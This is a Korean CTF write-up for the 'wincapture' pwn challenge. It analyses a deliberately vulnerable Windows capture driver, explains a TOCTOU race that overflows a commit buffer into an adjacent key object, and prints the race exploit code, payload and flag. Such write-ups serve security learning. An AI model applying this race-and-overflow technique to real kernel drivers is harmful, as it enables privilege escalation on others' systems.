---
ctf_name: "2026-OmniCTF"
challenge_name: "wincapture"
category: "pwn"
difficulty: "medium"
author: "no-carve-only-pizza"
date: "2026-07-18"
points: 96
tags: [windows, kernel-driver, reverse-engineering, race-condition, TOCTOU, named-pipe]
---

# WinCapture

## 문제 개요

Windows 패킷 캡처 드라이버 `WinCapture.sys`를 분석하고, 캡처 데이터를 commit하는 과정의 race condition을 이용해 key object를 변조하는 문제다.

- **카테고리**: Pwn / Windows Kernel
- **점수**: 96
- **출제자**: `Alex_Hossu`
- **제공 파일**: `WinCapture.sys`
- **실행 환경**: x64 Windows PE를 base64로 제출하면 Wine 기반 드라이버 시뮬레이터에서 실행
- **인터페이스**: `\\.\pipe\WinCapture`

문제 설명의 핵심은 다음과 같다.

```text
Find and exploit the race condition in IOCTL_COMMIT_CAPTURE.
Write exploit.exe (x64 Windows PE) that wins the race,
corrupts the key object, and retrieves the flag.
```

## 1. 드라이버 분석

`WinCapture.sys`는 64비트 PE 형식의 Windows Native 드라이버다.

```bash
file WinCapture.sys
rabin2 -I WinCapture.sys
r2 -A WinCapture.sys
```

DeviceControl 핸들러를 분석하면 다음 IOCTL을 찾을 수 있다.

| IOCTL | 값 | 기능 |
|---|---:|---|
| `STORE_CAPTURE` | `0xC2002000` | 슬롯 번호, 길이, 캡처 데이터 저장 |
| `ALLOC_COMMIT` | `0xC2002004` | commit buffer 할당 |
| `CREATE_TOKEN` | `0xC2002008` | 16바이트 key object 생성 |
| `COMMIT_CAPTURE` | `0xC200200C` | 슬롯 데이터를 commit buffer로 복사 |
| `GET_FLAG` | `0xC2002010` | key 검증 후 접근 허용 |

named pipe 요청과 응답 형식은 다음과 같다.

```text
request  = [u32 ioctl][u32 input_length][input]
response = [u32 ntstatus][u32 output_length][output]
```

### STORE_CAPTURE

입력은 `[index, length, data]` 구조다. 슬롯은 4개이며, 각 슬롯에는 사용자가 지정한 `length`와 최대 `0x1000`바이트의 데이터가 저장된다.

```c
struct store_request {
    uint32_t index;
    uint32_t length;
    uint8_t  data[0x1000];
};
```

### ALLOC_COMMIT과 CREATE_TOKEN

두 객체는 같은 bump allocator에서 16바이트 단위로 정렬되어 순서대로 배치된다.

```text
ALLOC_COMMIT(8)

pool + 0x00  commit buffer (8 bytes, allocation size 0x10)
pool + 0x10  key object     (0x10 bytes)
```

key object의 초기 상태는 다음과 같다.

```c
key->magic  = 0x4b455901;
key->granted = 0;
```

`GET_FLAG`는 `magic`이 유지되고 `granted`가 0이 아닐 때만 성공한다.

```c
if (key != NULL &&
    key->magic == 0x4b455901 &&
    key->granted != 0) {
    return ACCESS_GRANTED;
}
```

## 2. 취약점

`COMMIT_CAPTURE`에는 슬롯 길이를 검사한 뒤 복사 직전에 다시 읽는 TOCTOU가 있다.

```c
length = slot[index].length;

if (commit_size < length)
    return STATUS_INVALID_PARAMETER;

calculate_checksum(index, length);

length = slot[index].length;  // 두 번째 읽기
if (length > 0x1000)
    length = 0x1000;

memcpy(commit_buffer, slot[index].data, length);
```

검사 시점에는 `length = 8`, 복사 시점에는 `length = 24`가 되도록 다른 스레드에서 STORE 요청을 내면 8바이트 commit buffer에 24바이트가 복사된다.

```text
Thread A (COMMIT)                 Thread B (STORE)
----------------                 ----------------
read length = 8
check 8 <= commit_size
                                 change length = 24
read length = 24
memcpy(commit, data, 24)
```

commit allocation은 16바이트를 차지하므로 24바이트 복사의 마지막 8바이트가 바로 뒤 key object의 `magic`과 `granted`를 덮는다.

```text
payload + 0x00  commit data
payload + 0x10  01 59 45 4b 01 00 00 00
                ^ magic       ^ granted = 1
```

## 3. 익스플로잇

익스플로잇 순서는 다음과 같다.

1. `ALLOC_COMMIT(8)`로 작은 commit buffer를 만든다.
2. `CREATE_TOKEN`으로 key object를 commit buffer 바로 뒤에 배치한다.
3. 슬롯 0에 길이 8인 payload를 저장한다.
4. 별도 스레드에서 슬롯 길이를 8과 24로 계속 변경한다.
5. 메인 스레드에서 `COMMIT_CAPTURE`를 반복한다.
6. `GET_FLAG`가 성공하면 race를 중단한다.

최종 소스는 [`exploit.c`](exploit.c)에 있다. 핵심 race 코드는 다음과 같다.

```c
static DWORD WINAPI writer(void *unused) {
    HANDLE h = open_pipe();

    while (!stop) {
        request(h, small_req, 0x1010, 0, 0); // slot length = 8
        request(h, large_req, 0x1010, 0, 0); // slot length = 24
    }

    CloseHandle(h);
    return 0;
}

CreateThread(0, 0, writer, 0, 0, 0);

for (int i = 0; i < 20000; i++) {
    request(h, commit_req, 12, 0, 0);

    if (request(h, flag_req, 8, flag_out, sizeof(flag_out))) {
        stop = 1;
        say("WINCAPTURE_ACCESS_GRANTED\n");
        ExitProcess(0);
    }
}
```

payload에는 key object 위치에 들어갈 값을 8바이트 간격으로 반복해 넣었다.

```c
for (int j = 0; j < 0x1000; j += 8) {
    p32(payload + j,     0x4b455901u);
    p32(payload + j + 4, 1);
}
```

Windows import와 PE 크기를 줄이기 위해 MinGW-w64로 CRT 없이 빌드했다.

```bash
x86_64-w64-mingw32-gcc -Os -s -nostdlib -e entry \
  -fno-builtin -fno-tree-loop-distribute-patterns -fno-ident \
  -ffunction-sections -fdata-sections -Wl,--gc-sections \
  -Wl,--file-alignment,0x40 -Wl,--section-alignment,0x40 \
  -Wl,--no-insert-timestamp \
  -o exploit.exe exploit.c -lkernel32
```

제출 결과 서버가 key 변조를 확인하고 동적 플래그를 반환했다.

```text
WINCAPTURE_ACCESS_GRANTED

[+] Exploit verified. Team-bound flag:
OmniCTF{d1_093bc1423ad84c4f_9d6e5cb6016f7e5cdebd40d1f3d04a45_65fb73da21f603088f134b6a8ecd623e}
```

## 플래그

```text
OmniCTF{d1_093bc1423ad84c4f_9d6e5cb6016f7e5cdebd40d1f3d04a45_65fb73da21f603088f134b6a8ecd623e}
```

## 배운 점

- race condition은 단순히 스레드 수를 늘리는 것보다 **검사 시점과 사용 시점 사이에서 어떤 공유 상태를 바꿔야 하는지** 먼저 정확히 정의해야 한다.
- 바이너리 프로토콜에서는 헤더 크기를 한 필드만 잘못 추정해도 이후 모든 응답이 밀린다. IOCTL 자체가 차단됐다고 결론내기 전에 요청 경계를 독립적으로 검증해야 한다.
- bump allocator의 정렬 규칙을 알면 작은 overflow도 인접 객체의 보안 상태를 정밀하게 덮는 primitive로 바꿀 수 있다.
- 드라이버 원본의 취약 코드뿐 아니라 원격 시뮬레이터가 동시 요청을 어떻게 처리하는지도 익스플로잇 성공률에 직접 영향을 준다.

## 사용 도구

- `radare2`, `rabin2`, `objdump`, `strings`
- MinGW-w64 (`x86_64-w64-mingw32-gcc`)
- OpenSSL `s_client`
